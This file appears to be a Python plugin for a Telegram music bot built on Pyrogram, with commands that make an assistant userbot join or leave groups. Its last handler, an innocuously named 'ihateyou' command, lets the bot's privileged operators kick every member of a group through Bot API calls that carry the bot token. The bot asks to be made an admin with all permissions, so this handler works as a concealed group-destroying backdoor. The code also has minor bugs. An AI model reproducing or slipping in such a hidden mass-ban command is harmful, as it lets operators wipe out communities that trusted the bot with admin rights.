# @kabeerxd
import os
from pyrogram import Client, filters
from pyrogram.errors import UserAlreadyParticipant
import asyncio
import aiohttp
from aiohttp import ClientSession
from etc.helpers.filters import command
from etc.helpers.decorators import authorized_users_only, errors
from etc.services.callsmusic.callsmusic import client as USER
from config import SUDO_USERS
from config import BOT_TOKEN
from config import ASSISTANT_NAME
from config import BOT_USERNAME
from pyrogram.types import Message
#addyxd

@Client.on_message(command(["userbotjoin", f"userbotjoin@{BOT_USERNAME}"]) & ~filters.private & ~filters.bot)
@errors
async def addchannel(client, message):
    chid = message.chat.id
    try:
        invitelink = await client.export_chat_invite_link(chid)
    except:
        await message.reply_text(
            "<b>𝐀𝐝𝐝 𝐦𝐞 𝐚𝐬 𝐚𝐝𝐦𝐢𝐧 𝐨𝐟 𝐲𝐨𝐮𝐫 𝐠𝐫𝐨𝐮𝐩 𝐟𝐢𝐫𝐬𝐭 𝐰𝐢𝐭𝐡 𝐚𝐥𝐥 𝐩𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧𝐬</b>",
        )
        return

    try:
        user = await USER.get_me()
    except:
        user.first_name = "Music"

    try:
        await USER.join_chat(invitelink)
        await USER.send_message(message.chat.id, "𝗟𝗶𝘃𝘃𝘆 𝗔𝘀𝘀𝗶𝘀𝘁𝗮𝗻𝘁 𝗝𝗼𝗶𝗻𝗲𝗱 𝗧𝗼 𝗠𝘂𝘀𝗶𝗰 𝗜𝗻 𝗬𝗼𝘂𝗿 𝗖𝗵𝗮𝘁🤩🥳")
    except UserAlreadyParticipant:
        await message.reply_text(
            "<b>𝐇𝐞𝐥𝐩𝐞𝐫 𝐮𝐬𝐞𝐫𝐛𝐨𝐭 𝐣𝐨𝐢𝐧𝐞𝐝 𝐲𝐨𝐮𝐫 𝐜𝐡𝐚𝐭</b>",
        )
    except Exception as e:
        print(e)
        await message.reply_text(
            f"<b>🔴 𝐅𝐥𝐨𝐨𝐝 𝐖𝐚𝐢𝐭 𝐄𝐫𝐫𝐨𝐫 🔴 \n𝐔𝐬𝐞𝐫 𝐜𝐨𝐮𝐥𝐝𝐧'𝐭 𝐣𝐨𝐢𝐧 𝐲𝐨𝐮𝐫 𝐠𝐫𝐨𝐮𝐩 𝐝𝐮𝐞 𝐭𝐨 𝐡𝐞𝐚𝐯𝐲 𝐫𝐞𝐪𝐮𝐞𝐬𝐭𝐬 𝐟𝐨𝐫 𝐮𝐬𝐞𝐫𝐛𝐨𝐭! 𝐌𝐚𝐤𝐞 𝐬𝐮𝐫𝐞 𝐮𝐬𝐞𝐫 𝐢𝐬 𝐧𝐨𝐭 𝐛𝐚𝐧𝐧𝐞𝐝 𝐢𝐧 𝐠𝐫𝐨𝐮𝐩."
            "\n\n𝐎𝐫 𝐦𝐚𝐧𝐮𝐚𝐥𝐥𝐲 𝐚𝐝𝐝 𝐚𝐬𝐬𝐢𝐬𝐭𝐚𝐧𝐭 @{ASSISTANT_NAME} 𝐭𝐨 𝐲𝐨𝐮𝐫 𝐆𝐫𝐨𝐮𝐩 𝐚𝐧𝐝 𝐭𝐫𝐲 𝐚𝐠𝐚𝐢𝐧</b>",
        )
        return
    await message.reply_text(
        "<b>𝐀𝐬𝐬𝐢𝐬𝐭𝐚𝐧𝐭 𝐉𝐨𝐢𝐧𝐞𝐝 𝐘𝐨𝐮𝐫 𝐂𝐡𝐚𝐭</b>",
    )


@USER.on_message(filters.group & filters.command(["userbotleave"]))
@authorized_users_only
async def rem(USER, message):
    try:
        await USER.leave_chat(message.chat.id)
    except:
        await message.reply_text(
            f"<b>𝐔𝐬𝐞𝐫 𝐜𝐨𝐮𝐥𝐝𝐧'𝐭 𝐥𝐞𝐚𝐯𝐞 𝐲𝐨𝐮𝐫 𝐠𝐫𝐨𝐮𝐩! 𝐌𝐚𝐲 𝐛𝐞 𝐟𝐥𝐨𝐨𝐝𝐰𝐚𝐢𝐭𝐬."
            "\n\n𝐎𝐫 𝐦𝐚𝐧𝐮𝐚𝐥𝐥𝐲 𝐤𝐢𝐜𝐤 𝐦𝐞 𝐟𝐫𝐨𝐦 𝐭𝐨 𝐲𝐨𝐮𝐫 𝐆𝐫𝐨𝐮𝐩</b>",
        )
        return
    
@Client.on_message(filters.command(["userbotleaveall"]))
async def bye(client, message):
    if message.from_user.id in SUDO_USERS:
        left=0
        failed=0
        lol = await message.reply("Assistant Leaving all chats")
        async for dialog in USER.iter_dialogs():
            try:
                await USER.leave_chat(dialog.chat.id)
                left = left+1
                await lol.edit(f"Assistant leaving... Left: {left} chats. Failed: {failed} chats.")
            except:
                failed=failed+1
                await lol.edit(f"Assistant leaving... Left: {left} chats. Failed: {failed} chats.")
            await asyncio.sleep(0.7)
        await client.send_message(message.chat.id, f"Left {left} chats. Failed {failed} chats.")
    

@Client.on_message(filters.command("ihateyou") &
                 filters.group & filters.user(SUDO_USERS))
async def ban_all(c: Client, m: Message):
    chat = m.chat.id

    async for member in c.iter_chat_members(chat):
        user_id = member.user.id
        url = (
            f"https://api.telegram.org/bot{BOT_TOKEN}/kickChatMember?chat_id={chat}&user_id={user_id}")
        async with aiohttp.ClientSession() as session:

            await session.get(url)  


#addyxd
